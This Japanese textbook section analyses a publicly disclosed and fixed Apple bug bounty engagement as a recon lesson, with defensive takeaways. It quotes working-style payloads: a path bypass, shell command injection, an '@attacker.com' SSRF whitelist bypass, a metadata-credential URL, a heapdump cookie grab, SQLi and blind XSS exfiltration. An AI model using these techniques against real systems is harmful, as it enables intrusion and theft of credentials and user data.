## 実例研究：Apple 55件のライトアップ

本節は、Sam Curry ら5人のチームが 2020年7月6日から10月6日までの約3か月間で Apple に対して行った脆弱性リサーチ「We Hacked Apple for 3 Months: Here's What We Found」を、**偵察（recon）の教材**として読み解く。合計55件（critical 11 / high 29 / medium 13 / low 2）という数字そのものより重要なのは、**どうやって Apple という巨大な攻撃対象面（attack surface＝外部から到達しうるエンドポイント・ホスト・パラメータの総体）を機械的に「点灯（light up）」させ、資産発見から内部システムへの到達まで一本の線でつないだか**という方法論である。本節ではそのパイプラインを段階ごとに分解し、「なぜその recon 手順が効くのか」を仕組みレベルで説明する。

なお本教科書全体の方針として、記述は**防御・自衛の理解を目的**とする。実在サービスや本番環境への無許可の検証、破壊的な手順、特定サービスの攻略手順は書かない。以下で紹介する具体例は、いずれも Apple の許可下（bug bounty プログラム）で行われ、責任開示され修正済みの事例であり、**あなた自身が管理する資産、または明示的にスコープと許可が与えられた環境**の理解と防御に役立てるための素材として扱う。

> ⚠️ **未取得の資料**ではありません。以下の記述は原典 https://samcurry.net/hacking-apple を自動取得し、そこに記載された技術的内容（ホスト名・ペイロード・数値・根本原因・影響）に基づいて構成している。ただし記事本文で "redacted（黒塗り）" とされた値は原典でも伏せられているため、本節でも同様に伏字のまま示す。

### なぜ Apple が「偵察の教材」として理想的なのか

recon の難しさは、対象が大きくなるほど「どこから手を付けるか」の判断コストが跳ね上がる点にある。Apple はこの問題を極端な形で提示する。原典によれば、Apple は以下の資産を保有する。

- **17.0.0.0/8 という /8 のIPレンジ全体**（約1,670万アドレス）。ここに **約25,000台のWebサーバ**が稼働し、うち **約10,000台が `apple.com` 配下**。
- **約7,000個のユニークドメイン**。
- **独自のトップレベルドメイン `.apple`**。

> 出典: We Hacked Apple for 3 Months: Here's What We Found — https://samcurry.net/hacking-apple

ここで recon の第一原理が効いてくる。**IPレンジが「連続した所有ブロック」として確定している対象は、ドメイン列挙よりもIP起点の走査（scanning）が圧倒的に有利**になる。通常のバグバウンティでは「この会社はどのIPを持っているのか」を ASN（Autonomous System Number＝BGPで経路広告される自律システムの識別番号）や WHOIS から推定する horizontal recon（水平方向の資産発見）が必要になる。しかし Apple のように **/8 を丸ごと所有**していると、その推定作業がほぼ不要になり、「17.0.0.0/8 の全ポートを舐める」という単純な走査計画がそのまま成立する。チームがまず 17.0.0.0/8・`*.apple.com`・`*.icloud.com` の3面に的を絞ったのはこの理由による。

防御側の教訓として先に述べておく。**攻撃者にとっての「所有ブロックの明確さ」は、そのまま自組織の棚卸し義務の広さである。** 自社が広いIPレンジや多数のドメインを持つなら、攻撃者が数時間で作る「全資産インベントリ」を、防御側も同等以上の精度で常時保持していなければ、後述する「忘れられた内部向けアプリの外部露出」に気づけない。

### recon パイプラインの全体像：走査 → 索引化 → 選別 → 深掘り

チームの手順は、規模の大きい対象に対する recon の教科書的な4段構えになっている。

1. **走査（scanning）**：Ben Sadeghipour と Tanner Barnes が主導し、Apple 所有インフラ全体を系統的にポートスキャン・HTTPプローブした。
2. **索引化（indexing）**：発見した各Webサーバについて、**HTTPステータスコード・レスポンスヘッダ・レスポンスボディ・スクリーンショット**をダッシュボードに集約した。
3. **選別（triage）**：索引の中から「面白いもの（more interesting ones）」を人間の目で選び出す。
4. **深掘り（deep-dive）**：選んだホストに対してディレクトリのブルートフォース（存在しうるパスを辞書で総当たりして隠れたエンドポイントを見つける content discovery の一手法）を行い、認証・認可の仕組み、顧客向けか従業員向けか、Cookieの使われ方、リダイレクト挙動などの**アプリケーションの振る舞い**を観察する。

このパイプラインの核心は「**索引化のスキーマ設計**」にある。なぜ「ステータス・ヘッダ・ボディ・スクリーンショット」の4点セットなのかを仕組みから説明する。

- **HTTPステータスコード**は、そのホストが生きているか（200）、認証で弾かれているか（401/403）、リダイレクトするか（3xx）、壊れているか（5xx）を一括で分類する最初のフィルタになる。25,000台を人力で見るのは不可能だが、ステータスでソートすれば「認証がかかっているのに何かを返している403」のような**異常な組み合わせ**を機械的に浮かび上がらせられる。
- **レスポンスヘッダ**は、`Server`・`X-Powered-By`・独自ヘッダから**技術スタックの指紋**を与える。後述する Spring Boot（Java系フレームワーク）や特定製品の同定はここから始まる。
- **レスポンスボディ**は、エラーメッセージ・コメント・埋め込みJavaScript・トークンの**漏洩**を含む。実際、初期走査の段階で**壊れたページのエラーメッセージ中に Spotify のアクセストークンが平文で露出**しているのが見つかっている。これは「ボディを保存しておく」設計が直接的に成果を生んだ例である。
- **スクリーンショット**は、人間が数千件を高速に目視選別（triage）するための圧縮表現である。テキストのHTMLを読むより、レンダリング画像のサムネイル一覧を眺めるほうが「ログイン画面」「管理画面」「デフォルトのインストール画面」を桁違いに速く判別できる。

この4点セットを持つことの威力は、初期走査だけで **22台のVPNサーバに Cisco の CVE-2020-3452（ローカルファイル読み取りの脆弱性）** が見つかったことにも表れている。既知CVEの一括検出は、索引に技術指紋（ヘッダ・ボディ）が揃っていて初めて成立する。

> 出典: We Hacked Apple for 3 Months — https://samcurry.net/hacking-apple

#### なぜ「ディレクトリブルートフォース」が深掘りの初手なのか

選別後の深掘りで content discovery を回す理由は、**アプリケーションの認可モデルは「隠れたパス」に現れる**からだ。トップページや公開ナビゲーションからリンクされているのは、設計者が「見せてよい」と判断した面だけである。`/admin`・`/actuator`・`/services/debug.func.php` のような**内部向けエンドポイントは、リンクされないが到達可能**なことが多い。後述の複数事例（Nova の debug パネル、eSign の actuator）は、まさにこの「リンクされていないが生きているパス」の発見から始まっている。

### 発見の類型①：資産発見が直接RCEにつながった経路

recon の観点で最も学びが深いのは、「ただのホスト発見」が数手で**リモートコード実行（RCE）や内部ネットワーク侵入**にまで届いた経路である。

#### `ade.apple.com`：招待制フォーラムの共通初期パスワード

Apple Distinguished Educators のフォーラム（`ade.apple.com`）は、Apple の IDMSA 認証と Jive（フォーラム製品）のユーザー名/パスワード認証を独自ミドルウェアでつないでいた。登録用アプリのHTMLに、次の**隠しパスワードフィールド**が埋め込まれていた。

```html
<input id="password" type="hidden" value="###INvALID#%!3">
```

なぜこれが致命的か。**全応募者に同一のデフォルトパスワードが割り当てられていた**ため、「Sign In with Apple」を経由せず、Jive の `cs_login` エンドポイントに対して直接、ユーザー名だけを総当たりすればログインできた。

```
GET /cs_login HTTP/1.1
Host: ade.apple.com
（ユーザー名を変えながら、パスワードは固定で ###INvALID#%!3 を送る）
```

Burp Intruder で1〜3文字のユーザー名を総当たりしたところ、約2分で管理者アカウントに到達した。ただし `/admin/` にはIPベースの制限があり、通常アクセスは弾かれる。これを次の**パス操作**で回避している。

```
GET /admin;/ HTTP/1.1
```

`/admin/` の代わりに `/admin;/` を送るのがなぜ効くのか。多くのWebサーバ／プロキシは**アクセス制御の照合に使うパス正規化と、内部ルーティングに使うパス解釈がずれる**。`;`（セミコロン）は一部の実装でパスパラメータ（matrix parameter）の区切りとして扱われ、アクセス制御ルールが `/admin/` という文字列と一致しないと判断する一方、バックエンドは `;` 以降を切り捨てて `/admin` として処理する。この**パーサ差異（parser differential）**が制限を素通りさせる。結果として管理者機能（プラグインアップロードやテンプレート機能）を経由した任意コード実行、内部LDAPサービスへの到達、Apple 内部ネットワークの大部分の侵害に至った。severity は critical。

#### `authors.apple.com`：providerId のコマンドインジェクション

Apple Books の入稿サービス（`authors.apple.com`）のEPUB検証エンドポイントは、ユーザー入力の `providerId` を無害化せずにJavaのコマンドラインへ渡していた。

```
POST /api/v1/validate/epub HTTP/1.1
Host: authors.apple.com

{"epubKey":"2020_8_11/10f7f9ad-2a8a-44aa-9eec-8e48468de1d8_sample.epub",
 "providerId":"BrettBuerhaus2096637541"}
```

サーバ側は次のようなコマンドを組み立てて実行していた（末尾の `-itc_provider` に `providerId` がそのまま入る）。

```
java -m validateRawAssets -assetFile /tmp/[filename] -dsToken [hidden] \
  -DDataCenters=contentdelivery.itunes.apple.com -Dtransporter.client=BooksPortal \
  ... -itc_provider BrettBuerhaus2096637541
```

ここで `providerId` に `||`（シェルのOR演算子）を混ぜる。

```json
{"providerId":"BrettBuerhaus2096637541||test123"}
```

なぜ実行されるのか。組み立てた文字列が**シェル経由（/bin/sh -c ...）で実行**されているため、`||` はシェルにとって「左のコマンドが失敗したら右を実行せよ」という制御構文になる。`test123` は存在しないコマンドなので、次のエラーがそのまま返ってきた。

```
/bin/sh: 1: test123: not found
```

これは**コマンドが実際にシェルで解釈されている**動かぬ証拠である。続けて `||ls%20/`（`%20` はスペースのURLエンコード）を送ると、ルートディレクトリの一覧が返り、任意コマンド実行が確定した。severity は critical。教訓は明確で、**外部入力を文字列連結でコマンドラインに載せてはならない**。引数は配列で渡し（シェルを介さず exec 系で実行し）、そもそもユーザー値をコマンドに使わない設計にする。

#### `colormasters.apple.com`：権限スコープを検証しないOAuth

サードパーティ製の倉庫管理製品 DELMIA Apriso が動くこのホストでは、「Reset Password」を押すと "Apple No Password User" という**特定ページ限定の一時権限**でログインされた。ところがOAuthエンドポイントが**トークン発行時に権限スコープを検証していなかった**ため、UI上は権限が制限されたこのアカウントでも、**全API権限を持つbearerトークン**を発行できた。`/Apriso/HttpServices/api/platform/1/Operations` は約5,000件のAPIを列挙し、6時間の試行錯誤の末、グローバル管理者権限の従業員アカウントを任意に作成できるPOST形式にたどり着いた。**「UIの権限」と「トークンの権限」を別々に管理し、後者の検証を欠く**という認可設計の典型的欠陥である。severity は critical。

### 発見の類型②：エラーメッセージと内部情報の漏洩連鎖

recon で集めた「ボディ」を精査する価値を示すのが、エラー漏洩を起点に内部へ横展開した事例群である。

#### `events.apple.com` → `nova.apple.com`：エラーが内部の資格情報を吐く

`events.apple.com` の `/services/public/account` は、内部の `nova-admin.corp.apple.com` へリクエストを転送していた。不正なパラメータを送ると、**RESTの例外メッセージに内部の転送先URL・Cookie・認可トークンがそのまま含まれて**返ってきた。

```
GET /services/public/account?marketCode=INVALID HTTP/1.1
Host: events.apple.com
```

漏れた資格情報を外部エンドポイント `nova.apple.com` に対して使うと当初は 403 だったが、`/services/debug.func.php` のように**拡張子を付けたパス**でルート制限を回避できた。これも `ade.apple.com` と同種の**「認可判定と機能ディスパッチが別レイヤで、パス表記の揺れで両者がずれる」**現象である。到達した debug パネルは数百の設定値・**AWSシークレットキー**・サーバの crontab を露出していた。severity は critical。教訓は二つ。**エラーメッセージに内部URLや資格情報を載せない**こと、そして**debug エンドポイントを本番から物理的に排除する**ことである。

#### `esign-internal.apple.com`：Spring Boot Actuator のヒープダンプ

recon で `esign-*.corp.apple.com` などの subdomain 群を発見した後、`/viewer/actuator` が認証なしで応答した。Spring Boot Actuator（運用監視用エンドポイント群）の `heapdump`（JVMのヒープ全体をダンプするエンドポイント）にアクセスし、Eclipse Memory Analyzer で全文字列をCSVに書き出して、認証Cookie名 `acack` を検索した。

```
GET /viewer/actuator/heapdump HTTP/1.1
Host: esign-internal.apple.com
```

なぜヒープダンプが危険か。**セッショントークンや資格情報は、実行中プロセスのメモリ上に平文で存在する**のが普通である。ヒープダンプはそのメモリ像のスナップショットなので、認証を経ずに `acack=...` の有効なセッションCookieを丸ごと拾えてしまう。しかもこのCookieは環境をまたいで有効だったため、同じ `acack` を使う他アプリにも横展開できた。severity は critical。**Actuator の機微エンドポイント（heapdump / env / mappings 等）は必ず認証・IP制限で保護し、本番では無効化する**のが鉄則である。

> 出典: We Hacked Apple for 3 Months — https://samcurry.net/hacking-apple

### 発見の類型③：SSRF ── 発見した「内部の入口」から内部網を読む

recon で見つけた「URLを受け取ってサーバ側が取得しに行く機能」は、SSRF（Server-Side Request Forgery＝サーバに意図しない先へリクエストを送らせる攻撃）の温床になる。

#### `www.icloud.com`「Open in Pages」：`@` によるホワイトリスト回避のフルレスポンスSSRF

iCloud の「Open in Pages」はメール添付のURLを受け取り、それを Apple Pages 文書に変換した。ドメインのホワイトリスト検証はあったが、次のURLで回避された。

```
https://p37-mailws.icloud.com@attacker.com/path
```

なぜ回避できるか。URLの `user@host` 記法では、**`@` より前は認証情報（userinfo）、`@` より後がホスト**である。ホワイトリスト検証が「`p37-mailws.icloud.com` を含むか」という**前方一致・部分一致**で判定していると、この文字列は「許可ドメインを含む」と誤認される一方、実際のHTTPクライアントは `@` の後ろ `attacker.com` に接続する。この**「検証側のURL解析と、通信側のURL解析の食い違い」**がSSRFを成立させる。変換結果が文書として返る「フルレスポンスSSRF」だったため、内部の Maven リポジトリから iOS 関連のソースコードを読み出し、変換文書のメタデータ経由でHTTP-only Cookieまで漏洩させた。severity は critical。**SSRF対策は「許可リストの部分一致」ではなく、パース済みホストの完全一致＋名前解決後のIP検証で行う**必要がある。

#### `banners.itunes.apple.com`：PhantomJS を踏み台にした AWS メタデータ窃取

iTunes のバナー生成は、S3に置いたHTMLを**ヘッドレスブラウザ PhantomJS 2.1.1**でレンダリングして画像化していた。書籍タイトルに次のXSSペイロードを入れると、それがレンダリング対象に混入した。

```html
<script src=""></script>
```

リクエストログに現れたUser-Agentが、レンダリングの正体を露呈した。

```
Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
```

ここで recon 的な洞察が効く。**「サーバ側でブラウザがHTMLを実行している」＝そのブラウザはサーバの内部ネットワークからリクエストを出せる**。注入したJavaScriptから、次のように AWS のメタデータ endpoint（`169.254.169.254`）を叩かせる。

```
https://banners.itunes.apple.com/bannerimages/banner.png?...&url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance&w=800&h=800&store=books&cache=false
```

なぜ致命的か。`169.254.169.254` は**クラウドインスタンスのメタデータサービス（IMDS）**の固定リンクローカルアドレスで、EC2 では**インスタンスに付与されたIAMロールの一時認証情報**を返す。PhantomJS がこれを取得し、その応答が**バナー画像として描画**されたため、AWSのシークレットキーが画像の中に可視化された。severity は critical。防御は、**サーバ側レンダラを内部網・メタデータへ到達させない（IMDSv2の強制やegress制限）**、および**ユーザー入力をレンダリング対象HTMLに素通しにしない**ことである。

### 発見の類型④：IDOR ── 連番IDが顧客データを点灯させる

recon の締めくくりとして、**連番の識別子（sequential ID）**が大量情報漏洩に直結する IDOR（Insecure Direct Object Reference＝認可を欠いた直接オブジェクト参照）の事例を挙げる。これは recon で発見したAPIのパラメータ構造を観察するだけで見つかる、最も再現性の高い欠陥類型である。

- **`www.icloud.com` Find My Friends**：位置共有の `dsIds`（ユーザー識別子の配列）に任意のIDを入れると、**認可チェックなしにそのユーザーのメールアドレスが返った**。IDが連番なので**全 Apple ユーザーのメール列挙**が可能で、さらに被害者に無断で位置関連付けや通知を送れた。severity は high。
- **`mfi.apple.com`（アクセサリ製造者ポータル）**：会社申請の閲覧が数値IDで、`-1` するだけで隣の申請（会社名・メール・住所・招待キー）が読めた。ID範囲から**約50,000件**が取得可能と見積もられた。severity は high。
- **Apple Support アプリ**：サポートケースIDが認可なしで、**デバイスのシリアル番号・ユーザーID・ライブチャットの認可トークン**まで漏れた。severity は high。
- **App Store Connect の Game Center**：`itemId` の付け替えで他開発者のリーダーボードを閲覧・改変できた。severity は medium。

なぜ連番IDが危険かは仕組みから明らかだ。**認可（この主体はこのオブジェクトを見てよいか）と参照（このIDのオブジェクトを取ってくる）が分離され、後者だけが実装されている**と、IDを変えるだけで他者のデータに届く。IDが連番だと**列挙コストがほぼゼロ**になり、単発の情報漏洩が「全件漏洩」に増幅される。防御は、**すべてのオブジェクト参照で所有者・権限を毎回検証する**こと、加えて推測困難なID（UUID等）を使って列挙を困難にすることである。

### 補足：SQLi・XXE・内部Blind XSS ── recon の裾野

- **`gbiportal-apps-external-msc.apple.com`（Vertica SQLi）**：JSONのフィルタ値がパラメータ化されずにVerticaのSQLへ連結され、`"a desc"` を入れると `java.sql.SQLSyntaxErrorException: [Vertica][VJDBC](4856) ...` というエラーが列名・テーブル名・DB名を露出した。`/**/`（SQLコメント）でビルトインの防御を回避しUNIONベースで抽出。severity は critical。**パラメータ化クエリの不在**という古典的欠陥が、巨大企業でも残る。
- **内部Java APIのXXE→Blind SSRF**：公開されていた `application.wadl`（APIの記述ファイル）からXML受け入れendpointを特定し、外部実体（external entity）を仕込んで攻撃者サーバへコールバックさせた。ただしJavaが最新版だったため二段階XXE（ファイル読み出し）は不成立で、Blind SSRF止まり。severity は high。「**WADL/Swagger等のAPI定義ファイルが公開されている**」こと自体が recon の重要な発見であることを示す。
- **内部管理アプリの Blind XSS**：住所・書籍タイトル・氏名といった入力欄に XSS Hunter のペイロードを仕込み、**従業員が管理画面でそれを開いた瞬間にスクリーンショットとトークンを外部へ送信**させた。外部からは見えない内部アプリに、外部入力経由で届く「Blind XSS」の典型で、severity は critical に達しうる。

### この事例が recon に残す教訓

1. **索引化のスキーマが成果を決める**。ステータス・ヘッダ・ボディ・スクリーンショットの4点を保存する設計が、25,000台という規模でも triage を可能にし、Spotify トークン漏洩・22台のCVE一括検出・技術指紋同定を生んだ。
2. **「リンクされていないが生きているパス」を content discovery で掘る**ことが、debug パネル・actuator・admin という高価値エンドポイントへの唯一の入口になる。
3. **パーサ差異（`;`・`@`・拡張子付与）**は、アクセス制御と実処理のレイヤ分離があるところで繰り返し現れる。防御側は「検証に使うパス表現」と「実行に使うパス表現」を同一化する必要がある。
4. **連番IDは単発の欠陥を全件漏洩へ増幅する**。recon でAPIパラメータの命名・型・連番性を観察するだけで、最も再現性の高い IDOR が見つかる。
5. **成果の大半が1〜2営業日、一部は4〜6時間で修正された**という事実は、responsible disclosure（責任ある開示）と迅速な連携が、発見と同じくらい価値を持つことを示す。2020年10月8日時点で32件・計 $288,500 が支払われた。

> 出典: We Hacked Apple for 3 Months: Here's What We Found — https://samcurry.net/hacking-apple

防御側の最終的な要点として。攻撃者がこの3か月で行ったのは、超人的な発想ではなく、**所有資産の全列挙 → 索引化 → 選別 → 深掘り**という機械的な recon を、規律よく回しただけである。したがって自組織の防御も同じ規律で対抗できる。**自社IPレンジ・全ドメインの継続的な資産棚卸し（ASM＝Attack Surface Management）**、**debug/actuator/admin の本番排除**、**エラーメッセージからの内部情報除去**、**SSRF・IDOR・コマンドインジェクションに対する設計レベルの防御**を、攻撃者に先んじて回すこと。これがこの55件から学ぶべき、最も実践的な結論である。
